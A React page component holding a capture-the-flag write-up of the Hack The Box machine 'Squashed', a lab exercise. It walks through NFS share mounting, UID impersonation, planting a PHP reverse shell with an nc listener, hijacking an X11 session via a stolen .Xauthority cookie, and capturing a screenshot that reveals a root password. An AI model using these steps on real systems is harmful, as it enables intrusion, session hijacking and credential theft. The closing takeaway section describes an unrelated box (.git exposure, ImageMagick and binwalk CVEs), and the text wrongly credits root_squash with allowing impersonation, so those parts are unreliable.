import React from 'react';

// Import placeholder images - replace with actual screenshots
import squashedLogo from "../../assets/squashed/logo.png"
import hdbBanner from "../../assets/cyber/hdb.png"

import nmapScan from "../../assets/squashed/nmap-scan.png"
import showmountOutput from "../../assets/squashed/showmount.png"
import nfsTree from "../../assets/squashed/tree1.png"
import uidVerification from "../../assets/squashed/tester.png"
import htmlTree from "../../assets/squashed/tree2.png"
import webIndex from "../../assets/squashed/index1.png"
import nfsIndex from "../../assets/squashed/index2.png"
import apacheHeader from "../../assets/squashed/apache.png"
import browserVisit from "../../assets/squashed/url.png"
import alex from "../../assets/squashed/alex.png"
import etcExports from "../../assets/squashed/etc-exports.png"
import rossHome from "../../assets/squashed/ross-home.png"
import wCommand from "../../assets/squashed/w.png"
import xwdScreenshot from "../../assets/squashed/screen.png"
import rootShell from "../../assets/squashed/root.png"
import lightDM from "../../assets/squashed/lightdm.png"

const Squashed = () => {
    const scrollToSection = (sectionId) => {
        const element = document.getElementById(sectionId);
        if (element) {
            element.scrollIntoView({ behavior: 'smooth', block: 'start' });
        }
    };

    return(
        <div className="w-[100%] bg p-10 flex flex-col justify-center items-center">
                
            <div className="w-[80%] relative bg border-[3px] p-10 flex flex-col items-center rounded bg-[rgba(255,255,255,0.1)]">
                <div className="absolute border right-0 top-0" style={{borderBottomLeftRadius:10}}>
                    <h3 className="text-white p-2 text-[5px] md:text-[12px] md:p-3">Created at: <span className="opacity-80">7/20/2025</span></h3>
                </div>
                <h2 className="text-white text-[30px] md:text-[50px]">Squashed</h2>
                <h2 className="text-white text-[10px] opacity-80 font-thin text-center md:text-[20px]">Welcome to Squashed, a fascinating journey through Network File System (NFS) misconfigurations and X11 session hijacking. Discover how improper NFS exports can lead to user impersonation, explore the intricacies of UID manipulation, and learn how X11 can be leveraged for privilege escalation. This box demonstrates the critical importance of proper NFS security and display manager configurations!</h2>
                
                <div className="flex flex-wrap justify-center gap-2 mt-4">
                    {["NFS", "uid change", "root_squash", "X11 hijacking", ".Xauthority", "xwd screenshot", "user impersonation", "PHP webshell"].map((tag, index) => (
                        <span key={index} className="bg-[rgba(255,255,255,0.2)] text-white px-3 py-1 rounded-full text-xs md:text-sm border border-white/30">
                            {tag}
                        </span>
                    ))}
                </div>
            </div>
            
            
            <div className="w-[80%] bg  p-10 flex flex-col items-center rounded ">
                <img className="relative w-[80%]  border-[2px]" src={squashedLogo} alt="squashed landing page" />
                <img className="relative w-[80%] border-[2px]" src={hdbBanner} alt="htb banner" />
            </div>

            
              <div className="relative align-center left-0 right-0 z-50 opacity-100  w-[60%] rounded  backdrop-blur-md border-bold md:mb-[-55px]">
                <div className="max-w-6xl mx-auto px-4 py-3">
                    <div className="flex items-center justify-between">
                        <div className="text-white font-semibold text-lg">
                            Squashed HTB
                        </div>
                        <nav className="hidden md:flex items-center space-x-6 md:px-10">
                            <button 
                                onClick={() => scrollToSection('overview')}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-1 rounded"
                            >
                                Overview
                            </button>
                            <button 
                                onClick={() => scrollToSection('enumeration')}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-1 rounded"
                            >
                                Enumeration
                            </button>
                            <button 
                                onClick={() => scrollToSection('foothold')}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-1 rounded"
                            >
                                Foothold
                            </button>
                            <button 
                                onClick={() => scrollToSection('privilege-escalation')}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-1 rounded"
                            >
                                Privesc
                            </button>
                            <button 
                                onClick={() => scrollToSection('takeaway')}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-1 rounded"
                            >
                                Takeaway
                            </button>
                        </nav>
                        
                        {/* Mobile Menu Button */}
                        <div className="md:hidden">
                            <button 
                                id="mobile-menu-btn"
                                onClick={() => {
                                    const menu = document.getElementById('mobile-menu');
                                    menu.classList.toggle('hidden');
                                }}
                                className="text-white hover:bg-white/10 p-2 rounded"
                            >
                                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 6h16M4 12h16M4 18h16" />
                                </svg>
                            </button>
                        </div>
                    </div>
                    
                    {/* Mobile Menu */}
                    <div id="mobile-menu" className="hidden md:hidden mt-3 pb-3 border-t border-white/10 pt-3">
                        <div className="flex flex-col space-y-2">
                            <button 
                                onClick={() => {
                                    scrollToSection('overview');
                                    document.getElementById('mobile-menu').classList.add('hidden');
                                }}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-2 rounded text-left"
                            >
                                Overview
                            </button>
                            <button 
                                onClick={() => {
                                    scrollToSection('enumeration');
                                    document.getElementById('mobile-menu').classList.add('hidden');
                                }}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-2 rounded text-left"
                            >
                                Enumeration
                            </button>
                            <button 
                                onClick={() => {
                                    scrollToSection('foothold');
                                    document.getElementById('mobile-menu').classList.add('hidden');
                                }}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-2 rounded text-left"
                            >
                                Foothold
                            </button>
                            <button 
                                onClick={() => {
                                    scrollToSection('privilege-escalation');
                                    document.getElementById('mobile-menu').classList.add('hidden');
                                }}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-2 rounded text-left"
                            >
                                Privesc
                            </button>
                            <button 
                                onClick={() => {
                                    scrollToSection('takeaway');
                                    document.getElementById('mobile-menu').classList.add('hidden');
                                }}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-2 rounded text-left"
                            >
                                Takeaway
                            </button>
                        </div>
                    </div>
                </div>
                </div>
          

            <div className="h-1 border w-[100%] bg-white rounded opacity-90 mt-10" />

            <div id="enumeration" className="w-[100%] flex flex-col items-center mt-20">
                <h1 className="text-white text-[25px] font-medium md:text-[40px]">Enumeration</h1>
                
                <div className="w-[80%] mt-8 text-white md:mt-[80px]">
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Let's start with an <span className="text-yellow-400">nmap</span> scan to see open ports
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            export RHOST=10.10.11.191
                        </code>
                    </div>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            sudo nmap $RHOST -p- -sVC -oN nmap/tcp.txt
                        </code>
                    </div>
                    
                    <img className="w-full border-[2px] relative border-white/30 rounded mb-6" src={nmapScan} alt="nmap scan results" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        We see a <span className="text-red-400">Network File System</span> present which is very interesting. Firstly, I want to enumerate it first
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            showmount -e $RHOST
                        </code>
                    </div>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={showmountOutput} alt="showmount output" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        We can see that there are shares available to mount so let's mount them:
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            mkdir /mnt/sqh
                        </code>
                    </div>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            sudo mount -t nfs $RHOST:/ /mnt/sqh
                        </code>
                    </div>
                    
                    <img className="w-[500px] relative border-[2px] border-white/30 rounded mb-6" src={nfsTree} alt="NFS tree structure" />

                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Now we got this. Further enumerating we found a user on the system and his UID's
                    </p>

                    <p className="text-sm md:text-base mb-4 opacity-90">• <span className="text-yellow-400">www-data - 2017</span></p>
                    
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        And we can also see that permission is denied for html folder which is owned by <span className="text-blue-400">www-data</span>. What we can try is to change our <span className="text-yellow-400">UID</span> on the system hoping that there is a misconfiguration on the system's <span className="text-red-400">/etc/exports</span> NFS configuration and we can <span className="text-red-400 font-semibold">impersonate www-data</span>. This mis-configuration is <span className="text-red-400">root_squash</span> which if present can enable us to impersonate a user with a mounted share by changing the UID. So let's do exactly that - create a user on our attack system with <span className="text-yellow-400">UID 2017</span>:
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            sudo useradd tester
                        </code>
                    </div>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            sudo usermod -u 2017 tester
                        </code>
                    </div>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            sudo groupmod -g 2017 tester
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Now let's verify
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            cat /etc/passwd | grep tester
                        </code>
                    </div>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={uidVerification} alt="UID verification" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Perfect! Let's switch and see if the impersonation worked
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            su tester
                        </code>
                    </div>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            cd /mnt/sqh
                        </code>
                    </div>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            tree .
                        </code>
                    </div>
                    
                    <img className="w-[500px] relative border-[2px] border-white/30 rounded mb-6" src={htmlTree} alt="HTML directory tree" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Now we can see that the impersonation worked!! And from the files I can tell that the html folder holds a website. Remembering that there was a port open on <span className="text-red-400">80</span>, let's visit the website and from its files check whether they match verifying that this folder is being hosted. If so I could include a <span className="text-yellow-400">reverse shell</span> into this folder and execute it from the browser. Again assuming that in the <span className="text-blue-400">/etc/exports</span> file we are allowed to have <span className="text-red-400">rw</span> access
                    </p>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        <span className="text-yellow-400">Web index.html:</span>
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={webIndex} alt="Web index.html" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        <span className="text-yellow-400">NFS index.html:</span>
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={nfsIndex} alt="NFS index.html" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        And they are <span className="text-red-400">in-fact the same</span> so let's stick to the plan and create a reverse shell into the <span className="text-yellow-400">html folder</span>
                    </p>
                </div>
            </div>

            <div className="h-1 border w-[100%] bg-white rounded opacity-90 mt-10" />

            <div id="foothold" className="w-[100%] flex flex-col items-center mt-10">
                <h1 className="text-white text-[25px] font-medium md:text-[40px] md:mb-5">Foothold</h1>
                
                <div className="w-[80%] mt-8 text-white">
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Looking at the response header we can see that it's running on <span className="text-red-400">Apache 2.4.41</span>
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={apacheHeader} alt="Apache response header" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Which can execute <span className="text-yellow-400">.php</span> files. So let's make a php reverse shell using <span className="text-blue-400">pentestmonkey's php reverse shell on github</span>
                    </p>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        <span className="text-blue-400">https://github.com/pentestmonkey/php-reverse-shell</span>
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            cd /mnt/sqh/var/www/html
                        </code>
                    </div>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            nano shell.php
                        </code>
                    </div>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            [CNTR+V - From Github]
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Now start listening and execute it from the browser
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            nc -lvnp 9443
                        </code>
                    </div>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={browserVisit} alt="Browser visit to shell.php" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        And we got a shell as <span className="text-green-400">alex</span>
                    </p>

                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={alex} alt="Browser visit to shell.php" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Before we move on let's upgrade the shell
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6 overflow-x-auto">
                        <pre className="text-green-400 text-xs md:text-sm">
{`# In your reverse shell:
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Press Ctrl+Z to background
# On your attacking machine:
stty raw -echo; fg

# Press Enter twice, then:
export TERM=xterm
export SHELL=/bin/bash`}
                        </pre>
                    </div>
                    
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Also let's verify that our assumption in <span className="text-yellow-400">/etc/exports</span> was correct just for fun
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            cat /etc/exports
                        </code>
                    </div>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={etcExports} alt="/etc/exports configuration" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Assumption was correct - we could impersonate due to <span className="text-red-400">root_squash</span> and we could make a file due to <span className="text-yellow-400">rw</span>
                    </p>
                </div>
            </div>

            <div className="h-1 border w-[100%] bg-white rounded opacity-90 mt-10" />

            <div id="privilege-escalation" className="w-[100%] flex flex-col items-center mt-10">
                <h1 className="text-white text-[30px] font-medium md:text-[40px]">Privilege Escalation - P1</h1>
                
                <div className="w-[80%] mt-8 text-white">
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        I did some manual enumeration even ran <span className="text-yellow-400">linpeas</span> but found nothing so as last hope I remembered that we still have a whole un-enumerated folder tree in NFS home folder
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={rossHome} alt="Ross home directory" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        We can see that the files are belongs to the <span className="text-red-400">UID 1001</span> impersonating 1001 again lets us read and enumerate the files further. However remember we cannot write files here!
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            sudo useradd ross
                        </code>
                    </div>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            sudo usermod -u 1001 ross
                        </code>
                    </div>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            sudo groupmod -g 1001 ross
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Another interesting thing is the <span className="text-red-400">X</span>.
                    </p>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        <span className="text-yellow-400">X</span> is a portable, network-transparent window system for managing a windowed GUI. Essentially, when paired with a display manager, it serves as a full-fledged GUI which you can use to run programs that might not run headlessly.
                    </p>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        The presence of <span className="text-blue-400">.Xauthority</span> and <span className="text-blue-400">.xsession</span> files in the home directory indicate that a display might be configured, with ross potentially already authenticated. This theory is further supported by the fact that the display manager <span className="text-red-400">LightDM</span> is found in the <span className="text-yellow-400">/etc/passwd</span> file
                    </p>

                    <img className="w-[800px] relative border-[2px] border-white/30 rounded mb-6" src={lightDM} alt="HTML directory tree" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        The <span className="text-blue-400">.Xauthority</span> file is used to store credentials in the form of cookies used by <span className="text-yellow-400">xauth</span> when authenticating X sessions. When a session is started, the cookie is then used to authenticate the subsequent connections to that specific display.
                    </p>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        With that in mind, since we can <span className="text-red-400">read</span> the file using our newly created user <span className="text-yellow-400">ross</span>, we can steal the cookie and therefore act as the authenticated ross user and interact with the display
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            cat .Xauthority | base64
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        And on the shell we got copy and decode it in <span className="text-yellow-400">tmp</span> folder
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            echo 'AQAADHNx.....' | base64 -d > .Xauthority
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Setting the cookie is as easy as pointing the environment variable <span className="text-red-400">XAUTHORITY</span> to our cookie file.
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            export XAUTHORITY=/tmp/.Xauthority
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        We can now interact with the display, since we have essentially hijacked <span className="text-yellow-400">ross</span> session. In order to see what is happening on the display, we can take a <span className="text-red-400">screenshot</span> and open it <span className="text-blue-400">locally</span>. To do that, we need to know which display ross is using, which can be done using the <span className="text-yellow-400">w</span> command.
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            w
                        </code>
                    </div>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={wCommand} alt="w command output" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        In the FROM column, we can see that the display used is <span className="text-red-400">:0</span>. With that in mind, we can now use the <span className="text-yellow-400">xwd</span> command, which simply dumps an image of an X window, to get a screenshot of the display in its current state. We can read about possible parameters we might need in the manual page for <span className="text-blue-400">xwd</span>:
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            xwd -root -screen -silent -display :0 > /tmp/screen.xwd
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Now transfer it to the attack machine
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            python3 -m http.server
                        </code>
                    </div>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            wget http://$RHOST:8000/screen.xwd
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Opening it we can see <span className="text-red-400 font-semibold">root's password !!!</span>
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            open screen.xwd
                        </code>
                    </div>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={xwdScreenshot} alt="Screenshot showing root password" />
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-4">
                        <code className="text-green-400 text-sm">
                            root:cah$mei7rai9A
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Now from the shell we got we can switch to root for a <span className="text-red-400">root shell !!!</span>
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            su root
                        </code>
                    </div>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={rootShell} alt="root shell" />
                </div>
            </div>

            <div className="h-1 border w-[100%] bg-white rounded opacity-90 mt-10" />

            <div id="takeaway" className="w-[100%] flex flex-col items-center mt-10">
                <h1 className="text-white text-[20px] font-medium md:text-[30px]">Takeaway</h1>
                
                <div className="w-[80%] mt-8 text-white">
                    <div className="bg-[rgba(255,255,255,0.1)] p-6 rounded border border-white/30">
                        <h3 className="text-lg mb-4 text-yellow-400">Key Learning Points:</h3>
                        <ul className="space-y-2 text-sm md:text-base opacity-90">
                            <li>• <span className="text-red-400">Git Repository Exposure:</span> Exposed .git directories can leak critical source code, revealing database locations and application logic</li>
                            <li>• <span className="text-blue-400">ImageMagick Vulnerabilities:</span> CVE-2022-44268 allows arbitrary file reads through malicious PNG files, enabling sensitive data extraction</li>
                            <li>• <span className="text-yellow-400">Version Enumeration:</span> Always check versions of installed software - outdated binaries often contain exploitable vulnerabilities</li>
                            <li>• <span className="text-green-400">Process Monitoring:</span> Tools like pspy reveal background processes and scheduled tasks that may run with elevated privileges</li>
                            <li>• <span className="text-purple-400">Chained Exploits:</span> Combining multiple vulnerabilities (file read + RCE) can lead to complete system compromise</li>
                            <li>• <span className="text-orange-400">Binwalk Exploitation:</span> CVE-2022-4510 demonstrates how file analysis tools can be weaponized for remote code execution</li>
                            <li>• <span className="text-cyan-400">Automated Scanning:</span> Background malware scanners can be exploited by placing malicious files in monitored directories</li>
                        </ul>
                        
                        <h3 className="text-lg mt-6 mb-4 text-yellow-400">Tools Mastered:</h3>
                        <div className="grid grid-cols-2 md:grid-cols-4 gap-4 text-sm">
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-green-400">nmap</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-red-400">ffuf</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-blue-400">git-dumper</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-yellow-400">ImageMagick</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-purple-400">pspy</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-orange-400">binwalk</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-cyan-400">xxd</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-pink-400">identify</span>
                            </div>
                        </div>
                        
                        <div className="mt-6 p-4 bg-[rgba(255,0,0,0.1)] border border-red-400/50 rounded">
                            <p className="text-red-300 text-sm">
                                <strong>Security Insight:</strong> This box demonstrates the critical importance of proper source code management and version control. 
                                The exposed .git repository provided a roadmap for exploitation, while outdated software versions created multiple attack vectors. 
                                The combination of information disclosure through file read vulnerabilities and privilege escalation through automated processes 
                                shows how attackers can chain seemingly minor issues into complete system compromise.
                            </p>
                        </div>
                        
                        <div className="mt-4 p-4 bg-[rgba(0,255,0,0.1)] border border-green-400/50 rounded">
                            <p className="text-green-300 text-sm">
                                <strong>Defensive Recommendations:</strong> Ensure .git directories are never exposed in production environments, 
                                regularly update all software components especially image processing libraries, implement proper access controls for 
                                automated scanning processes, and monitor for unusual file uploads or modifications in sensitive directories.
                            </p>
                        </div>
                    </div>
                </div>
            </div>
            
            <div className="h-1 border w-[100%] bg-white rounded opacity-90 mt-10" />
            
       
        </div>
    )
}

export default Squashed;